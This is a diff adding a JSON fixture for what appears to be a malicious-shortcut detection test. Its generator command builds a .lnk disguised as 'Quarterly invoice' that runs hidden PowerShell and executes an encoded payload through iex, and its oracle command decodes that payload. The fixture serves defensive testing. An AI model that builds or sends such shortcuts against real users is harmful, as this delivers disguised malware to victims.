@@ -1,0 +1,6 @@
+{
+ "expected_plain": "v=3|language=powershell|role=launcher|verdict=malicious|attack=T1204.002|adapter=shortcut_lnk|stage_count=2|steps=open_shortcut,run_powershell|campaign_id=LNK-c0ffee11|url=https://lnk-c0ffee11.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "M=$(printf %s '<plan>' | gzip -9n | base64 -w0); python3 -c \"import pylnk3,sys; pylnk3.for_file(r'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', sys.argv[1], arguments=sys.argv[2], description='Quarterly invoice')\" carrier_lnk_args.lnk \"-nop -w hidden -c \\\"\\$descriptor_c0ffee11 = '$M'; iex \\$descriptor_c0ffee11\\\"\"  (pylnk3 writer; args are UTF-16LE StringData, test reads the .lnk utf-8 'replace')",
+ "oracle_cmd": ".venv/bin/lnkparse -j carrier_lnk_args.lnk | jq -r .data.command_line_arguments | grep -o \"H4sI[^']*\" | base64 -d | gunzip"
+}
